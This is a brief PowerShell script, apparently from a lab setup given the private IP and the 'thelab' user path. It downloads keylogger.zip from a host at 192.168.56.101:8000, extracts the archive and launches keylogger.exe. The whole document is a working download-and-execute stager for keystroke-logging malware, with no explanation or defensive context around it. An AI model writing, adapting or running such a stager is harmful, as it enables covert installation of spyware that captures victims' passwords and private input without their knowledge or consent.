$url = "http://192.168.56.101:8000/keylogger.zip"
$outputFile = "C:/Users/thelab/Desktop/keylogger.zip"
$extractPath = "keylogger"
$exePath = "keylogger\keylogger.exe"

Invoke-WebRequest -Uri $url -OutFile $outputFile

Expand-Archive -Path $outputFile -DestinationPath $extractPath
Set-Location -Path $extractPath
Start-Process -FilePath $exePath